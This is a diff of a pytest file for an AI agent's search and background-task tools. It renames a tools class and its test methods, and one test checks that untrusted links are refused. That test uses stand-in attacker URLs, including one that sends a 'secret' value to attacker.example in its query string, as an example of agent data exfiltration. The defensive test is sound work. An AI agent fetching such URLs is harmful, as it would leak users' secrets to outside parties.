@@ -4,11 +4,11 @@ import httpx
 import pytest
 
 from common.exceptions import ToolExecutionError
-from core.agent.tools.jobs import ResearchJobTools
+from core.agent.tools.jobs import BackgroundTaskTools
 from core.agent.tools.search import SearchTools
 
 
-class Tools(SearchTools, ResearchJobTools):
+class Tools(SearchTools, BackgroundTaskTools):
     def __init__(self, *, query="", history=(), saved=()):
         self.agent_run = SimpleNamespace(user_query=query, history=list(history))
         self.project_id, self.session_id = "project-1", "session-1"
@@ -24,9 +24,9 @@ class Tools(SearchTools, ResearchJobTools):
             self.started.append(job)
             return {"job_id": "job-1", "state": "queued", "links": job["links"],
                     "session_id": None, "error_code": None,
-                    "question": job["question"], "depth": job["depth"]}
+                    "question": job["question"], "mode": job["mode"]}
 
-        self.research_jobs = SimpleNamespace(start=start)
+        self.background_tasks = SimpleNamespace(start=start)
 
 
 @pytest.mark.no_network
@@ -61,16 +61,16 @@ async def test_an_unknown_url_is_refused_before_any_request():
 
 
 @pytest.mark.no_network
-async def test_a_research_job_only_receives_links_the_run_already_trusts():
+async def test_a_background_task_only_receives_links_the_run_already_trusts():
     tools = Tools(query="Research https://docs.example.com/guide")
 
     with pytest.raises(ToolExecutionError, match="did not come from"):
-        await tools.start_research_job("Find more", links=["https://attacker.example/x"])
+        await tools.start_background_task("Find more", links=["https://attacker.example/x"])
     with pytest.raises(ToolExecutionError, match="did not come from"):
-        await tools.start_research_job("Read https://attacker.example/?d=secret")
+        await tools.start_background_task("Read https://attacker.example/?d=secret")
     assert tools.started == []
 
-    await tools.start_research_job("Dig deeper", links=["https://docs.example.com/guide"])
+    await tools.start_background_task("Dig deeper", links=["https://docs.example.com/guide"])
     assert tools.started[0]["links"] == ["https://docs.example.com/guide"]
 
 
